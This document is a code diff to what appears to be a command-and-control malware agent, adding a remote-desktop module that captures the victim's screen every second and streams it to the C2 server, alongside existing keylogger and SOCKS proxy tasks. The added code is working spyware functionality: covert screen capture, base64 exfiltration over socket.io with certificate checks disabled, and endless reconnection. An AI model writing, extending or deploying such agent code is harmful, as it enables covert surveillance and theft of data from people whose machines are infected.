@@ -25,7 +25,8 @@ required_modules = [
     ('keyboard', 'pynput'),
     ('socketio', 'python-socketio'),
     ('websocket', 'websocket-client'),
-    ('mss', None)
+    ('mss', None),
+    ('Pillow', None)
 ]
 
 # Check and install missing modules
@@ -87,6 +88,7 @@ try:
     import websocket
     import tempfile
     import multiprocessing
+    from PIL import Image
   
     
     print("All modules imported successfully!")
@@ -1661,6 +1663,214 @@ if platform.system() == 'Windows':
 
 
 # ======================
+# Remote Desktop Handler
+# ======================
+class RemoteDesktopHandler:
+    def __init__(self, agent_id, crypto, server_url, config):
+        self.agent_id = agent_id
+        self.crypto = crypto
+        self.config = config
+        self.server_url = server_url
+        self.socket = None
+        self.connected = False
+        self.screenshot_thread = None
+        self.screenshot_running = False
+        self.quality = 'medium'
+        self._setup_logger()
+
+    def _setup_logger(self):
+        self.logger = logging.getLogger('remote_desktop')
+        self.logger.setLevel(logging.DEBUG)
+        handler = logging.StreamHandler()
+        handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
+        self.logger.addHandler(handler)
+
+    def connect(self):
+        try:
+            self.logger.info("Connecting to Remote Desktop WebSocket")
+            self.socket = socketio.Client(
+                ssl_verify=False,
+                reconnection=True,
+                reconnection_attempts=0,  # Unlimited reconnection attempts
+                reconnection_delay=3000,
+                logger=True,
+                engineio_logger=True
+            )
+
+            @self.socket.on('connect', namespace='/remote_desktop')
+            def on_connect():
+                self.logger.info("Remote Desktop WebSocket connected")
+                auth_data = {{
+                    'agent_id': self.agent_id,
+                    'auth_token': self.crypto.encrypt({{
+                        'agent_id': self.agent_id,
+                        'timestamp': int(time.time())
+                    }})
+                }}
+                self.socket.emit('agent_connect', auth_data, namespace='/remote_desktop')
+                self.connected = True
+                self.start_screenshot_stream()
+
+            @self.socket.on('disconnect', namespace='/remote_desktop')
+            def on_disconnect():
+                self.logger.warning("Remote Desktop WebSocket disconnected")
+                self.connected = False
+                self.stop_screenshot_stream()
+
+            @self.socket.on('change_quality', namespace='/remote_desktop')
+            def on_change_quality(data):
+                self.quality = data.get('quality', 'medium')
+                self.logger.info(f"Quality changed to: {{self.quality}}")
+
+            @self.socket.on('stop_screenshots', namespace='/remote_desktop')
+            def on_stop_screenshots(data):
+                self.logger.info("Stopping screenshot stream")
+                self.stop_screenshot_stream()
+                self.connected = False
+
+            @self.socket.on('change_quality', namespace='/remote_desktop')
+            def on_change_quality(data):
+                self.quality = data.get('quality', 'medium')
+                self.logger.info(f"Quality changed to: {{self.quality}}")
+
+            # Parse server_url to separate base URL and socket.io path
+            from urllib.parse import urlparse
+            parsed_url = urlparse(self.server_url)
+            base_url = f"{{parsed_url.scheme}}://{{parsed_url.netloc}}"
+            socketio_path = f"{{parsed_url.path}}/socket.io" if parsed_url.path and parsed_url.path != '/' else '/socket.io'
+
+            self.socket.connect(
+                base_url,
+                socketio_path=socketio_path,
+                headers={{
+                    'User-Agent': self.config.USER_AGENT,
+                    'X-Agent-ID': self.agent_id
+                }},
+                namespaces=['/remote_desktop']
+            )
+
+            return True
+        except Exception as e:
+            self.logger.error(f"Remote Desktop connection failed: {{str(e)}}")
+            return False
+
+    def start_screenshot_stream(self):
+        if self.screenshot_running:
+            return
+
+        self.screenshot_running = True
+        self.screenshot_thread = threading.Thread(target=self._screenshot_loop, daemon=True)
+        self.screenshot_thread.start()
+        self.logger.info("Screenshot stream started")
+
+    def stop_screenshot_stream(self):
+        self.screenshot_running = False
+        if self.screenshot_thread:
+            self.screenshot_thread.join(timeout=1)
+            self.screenshot_thread = None
+        self.logger.info("Screenshot stream stopped")
+
+    def _screenshot_loop(self):
+        while self.screenshot_running and self.connected:
+            try:
+                screenshot_data = self._take_screenshot()
+                if screenshot_data and self.socket and self.connected:
+                    self.socket.emit('screenshot_update', {{
+                        'agent_id': self.agent_id,
+                        'screenshot': screenshot_data
+                    }}, namespace='/remote_desktop')
+                time.sleep(1)  # Send screenshot every second
+            except Exception as e:
+                self.logger.error(f"Screenshot loop error: {{str(e)}}")
+                time.sleep(2)
+
+    def _take_screenshot(self):
+        """Take screenshot using pyautogui with mss fallback"""
+        try:
+            # Try pyautogui first
+            try:
+                screenshot = pyautogui.screenshot()
+
+                # Apply quality settings
+                if self.quality == 'low':
+                    # Resize to 50% for low quality
+                    new_width = int(screenshot.width * 0.5)
+                    new_height = int(screenshot.height * 0.5)
+                    screenshot = screenshot.resize((new_width, new_height), Image.LANCZOS)
+                elif self.quality == 'high':
+                    # Keep original size for high quality
+                    pass
+                else:  # medium
+                    # Resize to 75% for medium quality
+                    new_width = int(screenshot.width * 0.75)
+                    new_height = int(screenshot.height * 0.75)
+                    screenshot = screenshot.resize((new_width, new_height), Image.LANCZOS)
+
+                buffered = io.BytesIO()
+                screenshot.save(buffered, format="JPEG", quality=70)
+                buffered.seek(0)
+                return base64.b64encode(buffered.read()).decode('utf-8')
+
+            except Exception as e:
+                self.logger.warning(f"PyAutoGUI screenshot failed: {{str(e)}}, trying MSS fallback")
+
+                # Fallback to MSS
+                try:
+                    import mss
+                    import mss.tools
+
+                    with mss.mss() as sct:
+                        monitor = sct.monitors[0]  # Primary monitor
+                        screenshot = sct.grab(monitor)
+
+                        # Apply quality settings to raw pixels
+                        if self.quality == 'low':
+                            # Convert to PIL Image and resize
+                            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
+                            new_width = int(img.width * 0.5)
+                            new_height = int(img.height * 0.5)
+                            img = img.resize((new_width, new_height), Image.LANCZOS)
+                            buffered = io.BytesIO()
+                            img.save(buffered, format="PNG", optimize=True)
+                            buffered.seek(0)
+                            return base64.b64encode(buffered.read()).decode('utf-8')
+                        elif self.quality == 'high':
+                            # Convert directly to PNG
+                            png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
+                            return base64.b64encode(png_bytes).decode('utf-8')
+                        else:  # medium
+                            # Convert to PIL Image and resize to 75%
+                            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
+                            new_width = int(img.width * 0.75)
+                            new_height = int(img.height * 0.75)
+                            img = img.resize((new_width, new_height), Image.LANCZOS)
+                            buffered = io.BytesIO()
+                            img.save(buffered, format="JPEG", quality=70)
+                            buffered.seek(0)
+                            return base64.b64encode(buffered.read()).decode('utf-8')
+
+                except ImportError:
+                    self.logger.error("MSS not available for screenshot fallback")
+                    return None
+                except Exception as mss_error:
+                    self.logger.error(f"MSS screenshot failed: {{str(mss_error)}}")
+                    return None
+
+        except Exception as e:
+            self.logger.error(f"Unexpected error during screenshot capture: {{str(e)}}")
+            return None
+
+    def disconnect(self):
+        self.stop_screenshot_stream()
+        if self.socket:
+            try:
+                self.socket.disconnect()
+                self.socket = None
+            except Exception as e:
+                self.logger.error(f"Disconnect error: {{str(e)}}")
+        self.connected = False
+
+# ======================
 # WebSocket Client
 # ======================
 class WebSocketClient:
@@ -1669,7 +1879,7 @@ class WebSocketClient:
         self.crypto = crypto
         self.config = config
         self.namespace = namespace
-        self.server_url = server_url.replace('https://', 'wss://').replace('http://', 'ws://') + '/socket.io'
+        self.server_url = server_url
         self.socket = None
         self.connected = False
         self.current_dir = os.getcwd()
@@ -1779,13 +1989,19 @@ class WebSocketClient:
             threading.Thread(target=keep_alive_loop, daemon=True).start()
 
             # Connect with timeout
+            # Parse server_url to separate base URL and socket.io path
+            from urllib.parse import urlparse
+            parsed_url = urlparse(self.server_url)
+            base_url = f"{{parsed_url.scheme}}://{{parsed_url.netloc}}"
+            socketio_path = f"{{parsed_url.path}}/socket.io" if parsed_url.path and parsed_url.path != '/' else '/socket.io'
+
             self.socket.connect(
-                self.server_url,
+                base_url,
+                socketio_path=socketio_path,
                 headers={{
                     'User-Agent': self.config.USER_AGENT,
                     'X-Agent-ID': self.agent_id
                 }},
-                transports=['websocket'],
                 namespaces=[self.namespace]
             )
 
@@ -2469,6 +2685,42 @@ class Agent:
                 else:
                     return self.socks_proxy.stop()
             
+            elif task_type == "remote_desktop":
+                action = task.get("action") or task.get("data", {{}}).get("action")
+                if action == "start":
+                    if not hasattr(self, 'remote_desktop_handler') or not self.remote_desktop_handler:
+                        self.remote_desktop_handler = RemoteDesktopHandler(
+                            self.agent_id,
+                            self.crypto,
+                            self.config.C2_SERVER,
+                            self.config
+                        )
+                    if self.remote_desktop_handler.connect():
+                        return {{
+                            "status": "success",
+                            "message": "Remote Desktop connected",
+                            "action": "start"
+                        }}
+                    else:
+                        return {{
+                            "status": "error",
+                            "message": "Failed to connect Remote Desktop",
+                            "action": "start"
+                        }}
+                elif action == "stop":
+                    if hasattr(self, 'remote_desktop_handler') and self.remote_desktop_handler and self.remote_desktop_handler.connected:
+                        self.remote_desktop_handler.disconnect()
+                        return {{
+                            "status": "success",
+                            "message": "Remote Desktop disconnected",
+                            "action": "stop"
+                        }}
+                    return {{
+                        "status": "error",
+                        "message": "No active Remote Desktop connection",
+                        "action": "stop"
+                    }}
+
             if task_type == "keylogger":
                 action = task.get("action") or task.get("data", {{}}).get("action")
                 if action == "start":
@@ -2498,7 +2750,7 @@ class Agent:
                     self.keylogger.ws_client = None
                     self.keylogger_ws_client = None
                     return {{"logs": result}}
-                
+
                 else:
                     return {{
                         "status": "error",
